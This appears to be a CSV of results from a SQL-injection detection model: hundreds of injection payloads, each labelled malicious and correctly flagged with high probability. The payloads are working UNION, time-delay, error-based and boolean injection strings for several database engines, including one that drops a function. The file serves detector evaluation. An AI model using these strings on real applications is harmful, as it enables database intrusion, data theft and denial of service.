Query,Label,predicted,correct,malicious_probability
"1%'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  '%'  =  '",1,1,True,0.9888474183329099
"-6412   )    )    as cnfs where 6557  =  6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",1,1,True,0.9595146714533098
"1%'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   '%'  =  '",1,1,True,0.9828959255448607
"1%""   )    )     )  ",1,1,True,0.9601452986752094
"1'+  (  select 'ndpx' where 4061  =  4061 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,True,0.9987623268064807
"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,True,0.9994813400237655
1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,True,0.999982773758833
"1"" where 5552  =  5552 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,True,0.9935103900165299
1'+  (  select 'wpnm' where 8223  =  8223 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   +',1,1,True,0.9987900304515546
"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'qeet'  =  'qeet",1,1,True,0.9959202209537653
"-5826""   )    )    union all select 7192,7192#",1,1,True,0.9179705401704155
"-9959""  )   where 7073  =  7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",1,1,True,0.9250073576361847
"-6381%""   )    )     )   union all select 1503,1503,1503,1503#",1,1,True,0.9661408352574089
1' and 7533  =  7533 and 'clqy' like 'clqy,1,1,True,0.9955186732916194
"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",1,1,True,0.9951017755631454
"1%""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""%""  =  """,1,1,True,0.9798836600619923
-5286' or 6783  =  1233,1,1,True,0.979377346313013
"1%""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""%""  =  """,1,1,True,0.9890737179533083
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xonc'  =  'xonc",1,1,True,0.9986131194132227
1 waitfor delay '0:0:5'# opyp,1,1,True,0.9999236481647057
"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,True,0.9996822373588876
1'||  (  select 'xugb' from dual where 6772  =  6772,1,1,True,0.998951364470332
"1"" union all select null,null,null,null,null,null,null,null,null--",1,1,True,0.9874792670268099
-8163   )    )    as cvai where 2360  =  2360 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,1,True,0.9953939847910659
1  )   where 1079  =  1079,1,1,True,0.9809102810446175
"1"" and   (  7424  =  2381  )  *2381 and ""dvju""  =  ""dvju",1,1,True,0.9620050774047789
1'+  (  select 'vtyw' where 7950  =  7950 order by 1--,1,1,True,0.9997273250176683
"1""   )    )    as paep where 8947  =  8947 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,True,0.9990819128649104
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  # sipo,1,1,True,0.9990744354573914
"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  # ujdg",1,1,True,0.9993829646281147
"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""qnqb"" like ""qnqb",1,1,True,0.9964967129093728
1'+  (  select 'jmdl' where 7827  =  7827,1,1,True,0.9921837354603051
1  )   as qwsa where 2874  =  2874,1,1,True,0.9532282242358193
1'   )    )    and 7230  =  2517,1,1,True,0.9912529487876907
1'  )   where 8291  =  8291,1,1,True,0.9900421751512203
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""ejmj"" like ""ejmj",1,1,True,0.9950163458955037
1  )   as ryks where 1196  =  1196,1,1,True,0.9727884113163778
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",1,1,True,0.9974812489355583
1%'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  ',1,1,True,0.9953741606036491
"1%""   )    )     )   and sleep  (  5  )   and    (    (     (  ""%""  =  """,1,1,True,0.9934000495070282
"1""  )   where 1416  =  1416 union all select null,null,null#",1,1,True,0.9697330559184374
"1'   )    )    as agdn where 8442  =  8442 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,1,True,0.9993586133589639
1  )   where 5025  =  5025,1,1,True,0.952787859643355
"1%""  )   union all select null,null,null,null,null#",1,1,True,0.946426807776793
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",1,1,True,0.9930459188895422
"-2247'  )   union all select 1202,1202,1202,1202,1202#",1,1,True,0.9788772148137983
"1'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,True,0.9981559391224855
"1"" and 6637  =  2321",1,1,True,0.9058737861926324
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'lqwz'  =  'lqwz",1,1,True,0.9977426253061078
"1%'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,True,0.9988519600815077
"-1550%""   )    )     )   order by 1--",1,1,True,0.9997512051908944
"1%'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   '%'  =  '",1,1,True,0.9967510167957314
"1"" where 7015  =  7015",1,1,True,0.9054886158389466
"1%'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '",1,1,True,0.9587397083764917
-6722'  )   order by 1#,1,1,True,0.983727252572238
"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,1,True,0.9977649480018871
"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""vziz""  =  ""vziz",1,1,True,0.9901001865519269
"1"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,1,True,0.9999500871617624
-4835   )    )     )   or   (  4219  =  2081  )  *2081 and    (    (     (  8536  =  8536,1,1,True,0.969382797130159
"1'   )    )    as yyja where 4321  =  4321 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,True,0.9983298120348729
"select sleep  (  5  )   and    (    (   ""%""  =  """,1,1,True,0.9965588518163815
"1%""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,True,0.9965432889558506
"1  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,True,0.9980537943396943
"1""  )   where 4038  =  4038 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,1,True,0.9999030277071455
"1""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bcxh"" like ""bcxh",1,1,True,0.9905501800360091
"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",1,1,True,0.9990268291888965
1 where 5443  =  5443,1,1,True,0.9532674347567217
"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",1,1,True,0.9262169841845476
1  )   as mixt where 1085  =  1085 or sleep  (  5  )  --,1,1,True,0.9998944512859876
1'   )    )     )   union all select null--,1,1,True,0.9990725936759879
"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""gcnq"" like ""gcnq",1,1,True,0.9937758507939058
"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",1,1,True,0.9905696799285274
"-5573'  )   union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",1,1,True,0.9859224838118695
"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",1,1,True,0.9816900399363258
"1  )   as otsb where 8380  =  8380 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,True,0.994087559478527
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",1,1,True,0.9950070069265116
"-5652%'  )   union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",1,1,True,0.9860380297433221
1  )   where 6884  =  6884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,True,0.9972458173660164
"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,True,0.9993841602524474
"1""   )    )    as zgig where 5748  =  5748 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,True,0.9982099650270471
1'||  (  select 'zwcp' where 3333  =  3333,1,1,True,0.9922840791683922
select   (  case when   (  8916  =  1357  )   then 8916 else 8916*  (  select 8916 from information_schema.character_sets  )   end  )  #,1,1,True,0.9976914617419643
"-1303' union all select 4840,4840#",1,1,True,0.9604008169314218
"1%'   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,True,0.9974394147393641
1'  )   where 7541  =  7541,1,1,True,0.989664715492887
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'cfzp' like 'cfzp",1,1,True,0.994451291585765
1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'vtoi' like 'vtoi,1,1,True,0.9947280740207434
-8397'   )    )     )   or 2171  =  4788,1,1,True,0.9637759916690928
"-8203""  )   union all select 6394,6394,6394,6394,6394--",1,1,True,0.9662565734646581
"1%'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",1,1,True,0.9956512225035663
"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""hbgr"" like ""hbgr",1,1,True,0.9917548684372663
"1""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""ajuh""  =  ""ajuh",1,1,True,0.977325604117577
"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",1,1,True,0.9547345987016843
-3535%'   )    )     )   or 5605  =  4660 and    (    (     (  '%'  =  ',1,1,True,0.9889309128850119
"1  )   where 5378  =  5378 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,1,True,0.9976973234349958
1'+  (  select 'zgtu' where 8419  =  8419,1,1,True,0.9877529052635421
1   )    )     )   and 8990  =  4775 and    (    (     (  1894  =  1894,1,1,True,0.9790995264994604
end and   (  '%'  =  ',1,1,True,0.9843346939009853
"1"" where 5406  =  5406 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,1,True,0.9907387133960192
"-3865""  )   where 3559  =  3559 union all select 3559,3559,3559,3559,3559,3559,3559--",1,1,True,0.9783106897003936
1%'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  '%'  =  ',1,1,True,0.9997687137798377
"1%'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   '%'  =  '",1,1,True,0.961663697345887
1'   )    )    as pdcl where 6964  =  6964,1,1,True,0.9891542603075266
"-9504%""   )    )    or 8098  =  7472",1,1,True,0.9114957257118138
"-1956""  )   where 1448  =  1448 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1,1,True,0.9966829435471974
1%'  )   and 4595  =  4595#,1,1,True,0.9675048312619811
1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,True,0.9999035536343909
"1 and make_set  (  8403  =  8403,8899  )  -- rbxf",1,1,True,0.9996766353078066
"1"" and make_set  (  4214  =  9503,9503  )   and ""phjg"" like ""phjg",1,1,True,0.9263550576627484
1%'  )   union all select null--,1,1,True,0.9970792156398015
"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,1,True,0.9912354648667651
"-6527'   )    )    union all select 5053,5053,5053,5053--",1,1,True,0.9917996080761011
1' where 8864  =  8864,1,1,True,0.987298744049416
"1  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  5132  =  5132",1,1,True,0.9803460332762313
1'   )    )    union all select null--,1,1,True,0.9991635918283933
select case when 2095  =  9074 then 1 else null end--,1,1,True,0.9864393664046562
1'||  (  select 'qstz' where 6835  =  6835,1,1,True,0.9908654683823169
-4961'  )   or 3038  =  3038,1,1,True,0.9910681234834737
"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",1,1,True,0.9811040091038336
"1'  )   where 6214  =  6214 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,1,True,0.9944957504458019
"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""uzjn""  =  ""uzjn",1,1,True,0.9979573057006712
"1'||  (  select 'osux' from dual where 7066  =  7066 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",1,1,True,0.9988058076727365
"1%'   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,True,0.9953221516437469
"1"" union all select null,null,null,null,null,null,null,null,null,null#",1,1,True,0.9386484510261474
"1%""  )   and sleep  (  5  )   and   (  ""%""  =  """,1,1,True,0.9943166911465738
"-5911 union all select 2245,2245,2245,2245,2245,2245#",1,1,True,0.948418359192289
"1'||  (  select 'scba' where 9079  =  9079 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,True,0.9993473934739573
-8099%'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  ',1,1,True,0.995920812553684
"-3733'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'ybgd'  =  'ybgd",1,1,True,0.996027635920183
"1""  )   where 5197  =  5197 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,True,0.9942388866353377
1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  #,1,1,True,0.9996754368795169
"1"" and sleep  (  5  )   and ""masm""  =  ""masm",1,1,True,0.9952566194952934
1'  )   as hcpp where 1863  =  1863,1,1,True,0.9944284991389671
"-4828'+  (  select qxnw where 9488  =  9488 union all select 9488,9488--",1,1,True,0.976821536342165
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""hcjz"" like ""hcjz",1,1,True,0.9764831648154886
"1' in boolean mode  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,True,0.999391736294869
"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",1,1,True,0.9958704222618748
"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",1,1,True,0.9527917723080334
1'  )   where 7537  =  7537 and 2006  =  2006,1,1,True,0.9879306743618425
"-1272' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,True,0.9988248088125369
"1""  )   where 8407  =  8407 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,True,0.9768998580464063
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",1,1,True,0.987734539301461
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",1,1,True,0.9877855155494012
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,1,1,True,0.9999294172295116
"1'   )    )    as jvwq where 6596  =  6596 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,True,0.99934909165681
"-7916'   )    )    union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",1,1,True,0.9360306885454536
1%' and 9198  =  9198--,1,1,True,0.9940921566087697
"1'||  (  select 'fdkl' where 4572  =  4572 union all select null,null,null,null,null,null,null,null,null#",1,1,True,0.9859718354182316
"1""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""awyk"" like ""awyk",1,1,True,0.929601858273654
1%'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  '%'  =  ',1,1,True,0.9980305027753291
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""xhvo""  =  ""xhvo",1,1,True,0.9734727802523677
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",1,1,True,0.9966677067350722
"1""   )    )    as ubrg where 7318  =  7318 and 7331  =  6529--",1,1,True,0.9870149437943037
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",1,1,True,0.9967521201511057
"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",1,1,True,0.9913526215654305
"1"" where 7828  =  7828",1,1,True,0.9159750552803707
1'||  (  select 'lljg' from dual where 7631  =  7631,1,1,True,0.9960132377839674
"-7551 or elt  (  6900  =  7195,7195  )  ",1,1,True,0.9432676294971918
"select * from generate_series  (  1134,1134,case when   (  1134  =  4909  )   then 1 else 0 end  )   limit 1--",1,1,True,0.9994003381785679
1  )   as iknl where 3885  =  3885 rlike sleep  (  5  )  #,1,1,True,0.9966913861445196
"1'   )    )    as oocd where 2919  =  2919 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,True,0.9992660731115858
"select * from generate_series  (  3086,3086,case when   (  3086  =  3327  )   then 1 else 0 end  )   limit 1--",1,1,True,0.9994632075646431
if  (  3245  =  6168  )   select 3245 else drop function nafj--,1,1,True,0.9557443240561319
"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""%""  =  """,1,1,True,0.9984647512742842
1'+  (  select xzse where 4530  =  4530,1,1,True,0.9780820942333254
1  )   where 7165  =  7165 and sleep  (  5  )  #,1,1,True,0.9983166134908287
1'  )   where 3588  =  3588,1,1,True,0.9871137416565613
"1' where 2391  =  2391 union all select null,null,null,null,null,null,null,null,null,null--",1,1,True,0.9953445920370673
"1""  )   as lgxc where 1117  =  1117 union all select null,null,null,null,null,null,null,null#",1,1,True,0.9677805606308238
1%'  )   and sleep  (  5  )  #,1,1,True,0.999786657934577
"1%'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   '%'  =  '",1,1,True,0.9857616560613892
"1' union all select null,null,null,null,null#",1,1,True,0.9911273533329933
"1,  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",1,1,True,0.9990520042641149
"1'||  (  select 'lstx' from dual where 2972  =  2972 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",1,1,True,0.9935726498236028
1 where 2649  =  2649 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1,1,True,0.9998144492749332
"1%""   )    )    union all select null#",1,1,True,0.952476322725671
"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'aiuy'  =  'aiuy",1,1,True,0.999256217906991
-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ',1,1,True,0.988199555042683
1'+  (  select idnb where 2338  =  2338,1,1,True,0.9682686458010176
"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'aduc'  =  'aduc",1,1,True,0.9980643517792355
